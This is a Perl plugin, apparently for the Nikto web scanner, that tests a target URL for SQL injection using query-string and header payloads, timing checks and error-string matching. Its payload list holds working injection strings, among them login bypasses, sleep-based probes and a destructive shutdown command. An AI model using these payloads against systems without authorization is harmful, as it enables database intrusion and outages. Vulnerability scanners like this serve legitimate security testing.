#!/usr/bin/perl
#
# Plugin: check_sql_injection.pl
# Purpose: Detect SQL Injection vulnerabilities via query analysis, timing-based probing and header fuzzing
# Author: TeslaAI Offensive Security Consilium
# Version: 2.0-industrial
# License: TeslaAI Secure License v1.3
# Updated: 2025-07-25

package nikto::plugins::injection::check_sql_injection;

use strict;
use warnings;
use URI::Escape;
use Time::HiRes qw(gettimeofday tv_interval);
use Digest::SHA qw(sha256_hex);
use HTTP::Request;

sub run_check_sql_injection {
    my ($target_url, $http_client, $logger) = @_;

    return unless $target_url;

    my @payloads = (
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--",
        "admin' --",
        "1); SELECT pg_sleep(5)--",
        "';shutdown--",
        "'||UTL_INADDR.GET_HOST_ADDRESS('a')||'"
    );

    my @headers = (
        ['User-Agent', "' OR 'x'='x"],
        ['X-Forwarded-For', "1' OR '1'='1"],
        ['X-Custom-Injection', "' OR SLEEP(5)--"]
    );

    my $base_path = '/sql-test';
    my $test_id = substr(sha256_hex(rand . time), 0, 12);

    foreach my $payload (@payloads) {
        my $encoded_payload = uri_escape($payload);
        my $uri = URI->new($target_url . $base_path);
        $uri->query("id=$encoded_payload");

        my $req = HTTP::Request->new(GET => $uri);
        $req->header('X-SQLi-Test' => $test_id);

        foreach my $hdr (@headers) {
            $req->header($hdr->[0] => $hdr->[1]);
        }

        my $start = [gettimeofday];
        my $res = $http_client->request($req);
        my $elapsed = tv_interval($start, [gettimeofday]);

        my $content = $res->decoded_content;

        if ($res->is_success && (
            $content =~ /(syntax|sql error|ORA-|mysql_fetch|unterminated|unrecognized token)/i ||
            $elapsed > 4.5
        )) {
            $logger->log_event({
                type        => 'vuln',
                plugin      => 'check_sql_injection',
                path        => $uri->as_string,
                severity    => 'high',
                description => 'SQL Injection vulnerability detected (payload: ' . $payload . ')',
                fingerprint => $test_id,
                method      => 'GET',
                latency     => sprintf("%.3f", $elapsed),
                reference   => 'CWE-89'
            });
            return 1;
        }
    }

    return 0;
}

1;
